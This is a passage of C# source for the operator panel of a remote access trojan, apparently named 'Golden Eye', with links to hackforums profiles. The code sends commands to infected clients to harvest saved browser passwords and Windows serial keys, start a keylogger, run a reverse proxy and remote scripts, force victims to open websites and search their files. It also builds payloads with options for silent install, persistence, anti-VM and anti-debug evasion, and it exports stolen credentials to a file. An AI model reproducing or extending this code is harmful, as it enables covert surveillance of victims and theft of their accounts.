                RemoteChat fm = new RemoteChat();
                fm.clientlcl = client;
                fm.velyseForm1.Text = "Remote Chat - " + item.SubItems[4].Text + "@" + item.SubItems[6].Text;
                fm.Name = ("|rmchat|" + client.UniqueID);
                fm.Text = ("Remote Chat - " + client.UniqueID);
                fm.Show();
            }
        }

        private void selectClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 0)
            {
                return;
            }
            listView1.BeginUpdate();

            foreach (ListViewItem item in listView1.Items)
            {
                if (item.Text.Equals(listView5.SelectedItems[0].Text))
                {
                    item.Selected = true;
                    velyseTabControl1.SelectedIndex = 0;
                }
            }
            listView1.EndUpdate();
        }

        private void openFileWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView5.SelectedItems)
            {
                if (item.SubItems[1].Text.Equals("Chrome") || item.SubItems[1].Text.Equals("Opera"))
                {
                    try
                    {
                        Process.Start(item.SubItems[2].Text);
                    }
                    catch (Exception eax)
                    {
                        MessageBox.Show("Couldnt open Website/File!");
                    }
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView5.SelectedItems)
            {
                item.Remove();
                if (velyseCheckbox6.Checked == true)
                {
                    if (item.SubItems[1].Equals("Windows Serial Key"))
                    {
                        string final2 = string.Empty;
                        final2 += "--------------------------" + Environment.NewLine;
                        final2 += "Client: " + item.Text + Environment.NewLine;
                        final2 += "Type: " + "Windows Serial Key" + Environment.NewLine;
                        final2 += "Operating System: " + item.SubItems[2].Text + Environment.NewLine;
                        final2 += "Serial Key: " + item.SubItems[4].Text + Environment.NewLine;
                        final2 += "Date: " + item.SubItems[5].Text + Environment.NewLine;
                        if (File.ReadAllText(t_TextBox1.Text).Contains(final2))
                        {
                            string read2 = File.ReadAllText(t_TextBox1.Text);
                            string write2 = read2.Replace(final2, "");
                            File.WriteAllText(write2, t_TextBox1.Text);
                        }
                    }
                    else
                    {
                        string final = "";
                        final += "--------------------------" + Environment.NewLine;
                        final += "Client: " + item.Text + Environment.NewLine;
                        final += "Type: " + item.SubItems[1].Text + Environment.NewLine;
                        final += "Website: " + item.SubItems[2].Text + Environment.NewLine;
                        final += "Username: " + item.SubItems[3].Text + Environment.NewLine;
                        final += "Password: " + item.SubItems[4].Text + Environment.NewLine;
                        final += "Date: " + item.SubItems[5].Text + Environment.NewLine;
                        if (File.ReadAllText(t_TextBox1.Text).Contains(final))
                        {
                            string read = File.ReadAllText(t_TextBox1.Text);
                            string write = read.Replace(final, "");
                            File.WriteAllText(write, t_TextBox1.Text);
                        }
                    }
                }
            }
        }

        private void getLatestDataToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("RECOVERY|passrec");
                client.Send("RECOVERY|winserial");
            }
        }

        private void exportPasswordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView5.Items.Count == 0)
            {
                return;
            }
            SaveFileDialog res2 = new SaveFileDialog();
            res2.Filter = "Text Files|*.txt";
            res2.Title = "Choose a File to Export the Passwords to";
            //When the user select the file
            if (res2.ShowDialog() == DialogResult.OK)
            {
                //Get the file's path
                var filePath = res2.FileName;
                string allpws = string.Empty;

                foreach (ListViewItem item in listView5.Items)
                {
                    allpws += item.Text + " | " + item.SubItems[1].Text + " | " + item.SubItems[2].Text + " | " + item.SubItems[3].Text + " | " + item.SubItems[4].Text + " | " + item.SubItems[5].Text + Environment.NewLine;
                }
                File.WriteAllText(filePath, allpws);
            }
        }

        private void clientIDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView5.SelectedItems[0].Text);
            }
        }

        private void typeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView5.SelectedItems[0].SubItems[1].Text);
            }
        }

        private void websiteFilenameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView5.SelectedItems[0].SubItems[2].Text);
            }
        }

        private void eMailUsernameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView5.SelectedItems[0].SubItems[3].Text);
            }
        }

        private void passwordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView5.SelectedItems[0].SubItems[4].Text);
            }
        }

        private void dateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView5.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView5.SelectedItems[0].SubItems[5].Text);
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
                Reverse_Proxy fm = new Reverse_Proxy();
                fm.client = client;
                fm.Name = ("|revproxy|" + client.UniqueID);
                fm.Text = ("Reverse Proxy - " + client.UniqueID);
                fm.Show();
            }
        }

        private void remoteScriptingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RemoteScripting fm = new RemoteScripting();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
                fm.Clientlist.Add(client);
            }
            fm.Name = ("|rmscripting|");
            fm.Text = ("Remote Scripting - " + fm.Clientlist.Count.ToString() + " Clients selected");
            fm.Show();
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (listView2.Items.Count == 0)
            {
                MessageBox.Show("Please add a Port to the list first! (Rightclick)");
                return;
            }
            button4.Enabled = false; // Start Listening Button
            button5.Enabled = true; // Stop Listening Button
            foreach (ListViewItem item in listView2.Items)
            {
                int port = int.Parse(item.Text);
                listener = new TcpListener(IPAddress.Any, port);
                listenerThread = new Thread(Listen);
                listenerThread.Start();
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            button4.Enabled = true; // Start Listening Button
            button5.Enabled = false; // Stop Listening Button
            listener.Stop();
            listenerThread.Abort();
        }

        private void addPortToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.Items.Count > 0)
            {
                MessageBox.Show("Multi Port Listening is not aviable yet! :(");
                return;
            }
            if (button4.Enabled == false)
            {
                MessageBox.Show("Please stop the Port Listening first!");
                return;
            }

            string port = Interaction.InputBox("Enter a Port Number", "Add Port", "9003", 0, 0);
            int portnew = 0;
            try
            {
                portnew = int.Parse(port);
            }
            catch (Exception eax) { MessageBox.Show("You have entered a invalid Port!"); return; }

            foreach (ListViewItem item in listView2.Items)
            {
                if (item.Text.Equals(portnew.ToString()))
                {
                    MessageBox.Show("This Port is already in the Portlist!");
                    return;
                }
            }
            listView2.Items.Add(portnew.ToString()).SubItems.Add("0");
        }

        private void removePortsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (button4.Enabled == false)
            {
                MessageBox.Show("Please stop the Port Listening first!");
                return;
            }
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                item.Remove();
            }
        }

        private void testPortsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select at least one Port to check!");
                return;
            }
            if (button4.Enabled == true)
            {
                MessageBox.Show("You should start the Port Listening first!");
                return;
            }

            string ipdns = Interaction.InputBox("Please enter your IP Address / DNS / VPN IP that you are using", "Enter IP/DNS", "", 0, 0);
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                if (IsPortOpen(ipdns, int.Parse(item.Text)) == true)
                {
                    MessageBox.Show("The Port " + item.Text + " is opened and working!");
                }
                else
                {
                    MessageBox.Show("The Port " + item.Text + " is closed. Please check your Router/Firewall!\nYou can also check your ports on 'canyouseeme.org'");
                }
            }
        }

        private bool IsPortOpen(string host, int port)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    var result = client.BeginConnect(host, port, null, null);
                    var success = result.AsyncWaitHandle.WaitOne(2000);
                    if (!success)
                    {
                        return false;
                    }

                    client.EndConnect(result);
                }
            }
            catch
            {
                return false;
            }
            return true;
        }

        private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView3.SelectedItems)
            {
                if (Directory.Exists(Application.StartupPath + @"\Client Data\" + item.Text + @"\Downloaded Files"))
                {
                    Process.Start(Application.StartupPath + @"\Client Data\" + item.Text + @"\Downloaded Files");
                }
            }
        }

        private void openFIleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView3.SelectedItems)
            {
                if (File.Exists(Application.StartupPath + @"\Client Data\" + item.Text + @"\Downloaded Files\" + item.SubItems[2].Text))
                {
                    Process.Start(Application.StartupPath + @"\Client Data\" + item.Text + @"\Downloaded Files\" + item.SubItems[2].Text);
                }
            }
        }

        private void selectClientToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count == 0)
            {
                return;
            }
            listView1.BeginUpdate();

            foreach (ListViewItem item in listView1.Items)
            {
                if (item.Text.Equals(listView3.SelectedItems[0].Text))
                {
                    item.Selected = true;
                    velyseTabControl1.SelectedIndex = 0;
                }
            }
            listView1.EndUpdate();
        }

        private void downloadAgainToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void remoteItemsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView3.SelectedItems)
            {
                if (File.Exists(Application.StartupPath + @"\Client Data\" + item.Text + @"\Downloaded Files\" + item.SubItems[2].Text))
                {
                    try
                    {
                        File.Delete(Application.StartupPath + @"\Client Data\" + item.Text + @"\Downloaded Files\" + item.SubItems[2].Text);
                    }
                    catch
                    {
                        MessageBox.Show("Couldnt delete File: " + Application.StartupPath + @"\Client Data\" + item.Text + @"\Downloaded Files\" + item.SubItems[2].Text);
                    }
                }
                item.Remove();
            }
        }

        private void copyFileLocationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 1)
            {
                return;
            }
            Clipboard.SetText(listView3.SelectedItems[0].SubItems[4].Text);
        }

        private void velyseButton1_Click(object sender, EventArgs e)
        {
            string seltxt = velyseComboBox1.GetItemText(velyseComboBox1.SelectedItem);

            if (velyseRadioButton1.Checked == true)
            {
                foreach (ListViewItem item in listView1.Items)
                {
                    Connection client = (Connection)item.Tag;
                    if (seltxt.Equals("Operating System"))
                    {
                        client.Send("GTHRINFO|" + "os");
                    }
                    else if (seltxt.Equals("Client File Location"))
                    {
                        client.Send("GTHRINFO|" + "clientloc");
                    }
                    else if (seltxt.Equals("Installed Antivirus"))
                    {
                        client.Send("GTHRINFO|" + "av");
                    }
                    else if (seltxt.Equals("Active Window"))
                    {
                        client.Send("GTHRINFO|" + "actwin");
                    }
                    else if (seltxt.Equals("Uptime"))
                    {
                        client.Send("GTHRINFO|" + "upt");
                    }
                    else if (seltxt.Equals("CPU"))
                    {
                        client.Send("GTHRINFO|" + "cpu");
                    }
                    else if (seltxt.Equals("GPU"))
                    {
                        client.Send("GTHRINFO|" + "gpu");
                    }
                    else if (seltxt.Equals("RAM"))
                    {
                        client.Send("GTHRINFO|" + "ram");
                    }
                }
            }
            else
            {
                foreach (ListViewItem item in listView1.SelectedItems)
                {
                    Connection client = (Connection)item.Tag;
                    if (seltxt.Equals("Operating System"))
                    {
                        client.Send("GTHRINFO|" + "os");
                    }
                    else if (seltxt.Equals("Client File Location"))
                    {
                        client.Send("GTHRINFO|" + "clientloc");
                    }
                    else if (seltxt.Equals("Installed Antivirus"))
                    {
                        client.Send("GTHRINFO|" + "av");
                    }
                    else if (seltxt.Equals("Active Window"))
                    {
                        client.Send("GTHRINFO|" + "actwin");
                    }
                    else if (seltxt.Equals("Uptime"))
                    {
                        client.Send("GTHRINFO|" + "upt");
                    }
                    else if (seltxt.Equals("CPU"))
                    {
                        client.Send("GTHRINFO|" + "cpu");
                    }
                    else if (seltxt.Equals("GPU"))
                    {
                        client.Send("GTHRINFO|" + "gpu");
                    }
                    else if (seltxt.Equals("RAM"))
                    {
                        client.Send("GTHRINFO|" + "ram");
                    }
                }
            }
        }

        private void selectClientToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count == 0)
            {
                return;
            }
            listView1.BeginUpdate();

            foreach (ListViewItem item in listView1.Items)
            {
                if (item.Text.Equals(listView4.SelectedItems[0].Text))
                {
                    item.Selected = true;
                    velyseTabControl1.SelectedIndex = 0;
                }
            }
            listView1.EndUpdate();
        }

        private void copyClientIDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 1)
            {
                return;
            }
            try
            {
                Clipboard.SetText(listView4.SelectedItems[0].Text);
            }
            catch
            {
                MessageBox.Show("Failed to copy Client ID!");
            }
        }

        private void copyValueToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 1)
            {
                return;
            }
            try
            {
                Clipboard.SetText(listView4.SelectedItems[0].SubItems[1].Text);
            }
            catch
            {
                MessageBox.Show("Failed to copy Value!");
            }
        }

        private void clearAllItemsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView4.Items.Clear();
        }

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            VisitWebsite vistw = new VisitWebsite(this);
            vistw.Show();
        }

        private void removeEntryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem im in listView6.SelectedItems)
            {
                im.Remove();
            }
        }

        private void resendCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView6.SelectedItems)
            {
                string url = item.Text;
                string mode = item.SubItems[1].Text;
                string mute = item.SubItems[2].Text;
                string repeat = item.SubItems[3].Text;
                string sendto = item.SubItems[4].Text;

                if (sendto.Equals("Selected"))
                {
                    foreach (ListViewItem item2 in listView1.SelectedItems)
                    {
                        Connection client = (Connection)item2.Tag;
                        client.Send("VISITWB|" + mode + "|" + url + "|" + repeat + "|" + mute);
                    }
                }
                else if (sendto.Equals("All"))
                {
                    foreach (ListViewItem item2 in listView1.Items)
                    {
                        Connection client = (Connection)item2.Tag;
                        client.Send("VISITWB|" + mode + "|" + url + "|" + repeat + "|" + mute);
                    }
                }
                item.ForeColor = Color.LightGreen;
            }
        }

        private void velyseCheckbox20_Click(object sender, EventArgs e)
        {
            if (velyseCheckbox20.Checked == true)
            {
                isFileSearcherOn = true;
                File.WriteAllText(Application.StartupPath + @"\Configuration\FileSearcher.ini", "enabled");
            }
            else
            {
                isFileSearcherOn = false;
                File.WriteAllText(Application.StartupPath + @"\Configuration\FileSearcher.ini", "disabled");
            }
        }

        private void removeItemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in listView7.SelectedItems)
            {
                i.Remove();
            }

            string final = "";
            foreach (ListViewItem it in listView7.Items)
            {
                final += it.Text + "²" + it.SubItems[1].Text + "²" + it.SubItems[2].Text + "²" + it.SubItems[3].Text + "³";
            }
            File.WriteAllText(Application.StartupPath + @"\Configuration\FileSearcherTasks.ini", final);
        }

        private void addFileToSearchForToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FileSearcherDialog vistw = new FileSearcherDialog(this);
            vistw.Show();
        }

        private void runMalwareCleanerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item2 in listView1.SelectedItems)
            {
                Connection client = (Connection)item2.Tag;
                client.Send("ANTIM");
            }
        }

        private void enableProactiveScannerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item2 in listView1.SelectedItems)
            {
                Connection client = (Connection)item2.Tag;
                client.Send("PROANTIME");
            }
        }

        private void disableProactiveScannerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item2 in listView1.SelectedItems)
            {
                Connection client = (Connection)item2.Tag;
                client.Send("PROANTIMD");
            }
        }

        private void runFileSearcherTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (isFileSearcherOn == true)
            {
                if (listView7.Items.Count == 0)
                {
                    MessageBox.Show("File Searcher is enabled but you dont have added any Tasks yet!");
                    return;
                }
                foreach (ListViewItem item2 in listView1.SelectedItems)
                {
                    Connection client = (Connection)item2.Tag;
                    string toSend = "";

                    foreach (ListViewItem i in listView7.Items)
                    {
                        string filename = i.Text;
                        string loc = i.SubItems[1].Text;
                        string action = i.SubItems[2].Text;
                        string taskid = i.SubItems[3].Text;
                        toSend += filename + "²" + loc + "²" + action + "²" + taskid + "³";
                    }
                    client.Send("filesearch|" + toSend);
                }
                if (listView1.SelectedItems.Count > 0)
                {
                    MessageBox.Show("The File Searcher Tasks has been executed.");
                    return;
                }
                return;
            }
            else
            {
                MessageBox.Show("The FileSearcher is not enabled at the moment!");
                return;
            }
        }

        private void addNewCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OnJoinCommandsDialog onjcmd = new OnJoinCommandsDialog(this);
            onjcmd.Show();
        }

        private void removeCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView9.SelectedItems)
            {
                item.Remove();
            }
            string final = string.Empty;
            foreach (ListViewItem i in listView9.Items)
            {
                final += i.Text + "²" + i.SubItems[1].Text + "²" + i.SubItems[2].Text + "²" + i.SubItems[3].Text + "²" + i.SubItems[4].Text + "³";
            }
            File.WriteAllText(Application.StartupPath + @"\Configuration\On Join Commands.ini", final);
        }

        private void addbuildlog(string txt)
        {
            richTextBox1.Text += txt + Environment.NewLine;
        }

        private void velyseButton5_Click(object sender, EventArgs e)
        {
            addbuildlog("Waiting for File imput...");
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();
            saveFileDialog1.Title = "[Builder] Save the File at";
            saveFileDialog1.Filter = "Executable File|*.exe";
            saveFileDialog1.Title = "Save an Image File";
            saveFileDialog1.ShowDialog();

            // If the file name is not an empty string open it for saving.
            if (saveFileDialog1.FileName != "")
            {
                addbuildlog("File will be saved at: " + saveFileDialog1.FileName);
                addbuildlog("Grabbing Builder Options...");
                string options = string.Empty;

                options += "clientID²" + textBox3.Text + "³";
                options += "DNSIP" + "²" + textBox2.Text + "³";
                options += "PORT" + "²" + textBox4.Text + "³";
                options += "INSTALL" + "²" + velyseCheckbox9.Checked.ToString() + "²" + textBox5.Text + "²" + textBox6.Text + "³";
                options += "SILENT" + "²" + velyseCheckbox10.Checked.ToString() + "³";
                options += "HIDE" + "²" + velyseCheckbox11.Checked.ToString() + "³";
                options += "BINARYPERSIST" + "²" + velyseCheckbox12.Checked.ToString() + "³";
                options += "PROCPERSIST" + "²" + velyseCheckbox13.Checked.ToString() + "³";
                options += "PROACTIVEANTIM" + "²" + velyseCheckbox14.Checked.ToString() + "³";
                options += "ANTIVM" + "²" + velyseCheckbox15.Checked.ToString() + "³";
                options += "ANTIDEBUG" + "²" + velyseCheckbox17.Checked.ToString() + "³";
                options += "ANTIDLL" + "²" + velyseCheckbox16.Checked.ToString() + "³";
                options += "SYSPROC" + "²" + velyseCheckbox18.Checked.ToString() + "³";

                addbuildlog("Sending Build Request...");
                licns.Send("REQBUILD|" + saveFileDialog1.FileName.Replace("|", "/") + "|" + licns.User + "|" + licns.Pass + "|" + licns.hwid + "|" + options);
                addbuildlog("Build Request sent! Waiting for File...");
            }
        }

        private void updateIPDNSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string newIP = Interaction.InputBox("Enter a new IP/DNS to update the Client(s) to", "Update IP/DNS", "", 0, 0);

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;

                client.Send("UTDP|" + newIP);
            }
        }

        private void velyseButton6_Click(object sender, EventArgs e)
        {
            string autoListen = "false";
            string notificationClientConnect = "false";
            string playsoundClientConnect = "false";
            string createFolderEachClient = "false";
            string disconnectOnClientError = "false";
            string writeAllLogTypesToFile = "false";
            string connectionlimit = "false";
            string connectionlimitNmbr = textBox1.Text;

            if (checkBox1.Checked == true)
            {
                autoListen = "true";
            }
            if (checkBox2.Checked == true)
            {
                notificationClientConnect = "true";
            }
            if (checkBox3.Checked == true)
            {
                playsoundClientConnect = "true";
            }
            if (checkBox4.Checked == true)
            {
                createFolderEachClient = "true";
            }
            createFolderEachClient = "true";
            if (checkBox5.Checked == true)
            {
                disconnectOnClientError = "true";
            }
            if (checkBox6.Checked == true)
            {
                writeAllLogTypesToFile = "true";
            }
            if (checkBox7.Checked == true)
            {
                connectionlimit = "true";
            }
            File.WriteAllText(Application.StartupPath + @"\Configuration\settings.ini", autoListen + "³" + notificationClientConnect + "³" + playsoundClientConnect + "³" + createFolderEachClient + "³" + disconnectOnClientError + "³" + writeAllLogTypesToFile + "³" + connectionlimit + "³" + connectionlimitNmbr);
        }

        private void t_LinkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://hackforums.net/member.php?action=profile&uid=4024022");
        }

        private void t_LinkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://hackforums.net/member.php?action=profile&uid=2388291");
        }

        private void t_LinkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://hackforums.net/member.php?action=profile&uid=3739228");
        }

        private void t_LinkLabel7_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://discord.gg/RkjKygm");
        }

        private void checkBox4_CheckedChanged(object sender)
        {
        }

        private void checkBox5_CheckedChanged(object sender)
        {
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView8.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please do not select more than one Log at once!");
                return;
            }
            listView1.BeginUpdate();

            foreach (ListViewItem item in listView1.Items)
            {
                if (item.Text.Equals(listView8.SelectedItems[0].Text))
                {
                    item.Selected = true;
                    velyseTabControl1.SelectedIndex = 0;
                }
            }
            listView1.EndUpdate();
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (listView8.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please do not select more than one Log at once!");
                return;
            }
            try
            {
                Clipboard.SetText(listView8.SelectedItems[0].Text);
            }
            catch { }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (listView8.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please do not select more than one Log at once!");
                return;
            }
            try
            {
                Clipboard.SetText(listView8.SelectedItems[0].SubItems[2].Text);
            }
            catch { }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            listView8.Items.Clear();
        }

        private void velyseButton3_Click(object sender, EventArgs e)
        {
            textBox5.Text = GetRandomString();
        }

        private void velyseButton4_Click(object sender, EventArgs e)
        {
            textBox6.Text = GetRandomString() + ".exe";

        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }


        private void keyloggerToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Connection client = (Connection)item.Tag;
                Keylogger fm = new Keylogger();
                fm.clientLcl = client;
                fm.Name = ("|keylogg|" + client.UniqueID);
                fm.Text = ("Keylogger - " + client.UniqueID);
                fm.Show();
            }
        }

        void doDashboardUpdate()
        {

            int total = 0;
            int onlineRightNow = listView1.Items.Count;
            int offline = 0;
            string[] subdirectoryEntries = Directory.GetDirectories(Application.StartupPath + @"\Client Data\");
            foreach (string subdirectory in subdirectoryEntries)
            {
                total = total +1;
            }
            offline = total - onlineRightNow;
           
            headerLabel6.Text = ""+ onlineRightNow;
         
            headerLabel7.Text = "" + offline;

            headerLabel8.Text = "" + total;
        }

        public List<string> countryCordinates = new List<string>();
        public List<string> connectedCountrys = new List<string>();
        void addWorldMapPoint()
        {
            Bitmap bmp = new Bitmap(pictureBox1.Image);
            using (Graphics g = Graphics.FromImage(bmp))
            {              
                foreach(string country in countryCordinates)
                {
                 
                    string coutryname = country.Split('|')[0];                 
                    int countryX = int.Parse(country.Split('|')[1]);
                    int countryY = int.Parse(country.Split('|')[2]);
                    if (connectedCountrys.Contains(coutryname))
                    {
                        g.DrawImage(new Bitmap(@"C:\Users\Admin\Desktop\Golden Eye\World Map Stuff\Marker_16px.png"), new Point(countryX, countryY));
                    }
                }
            }
            pictureBox1.Image = bmp;
        }

        private void button1_Click_1(object sender, EventArgs e)
        {

            addWorldMapPoint();
        }
        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }


    }
}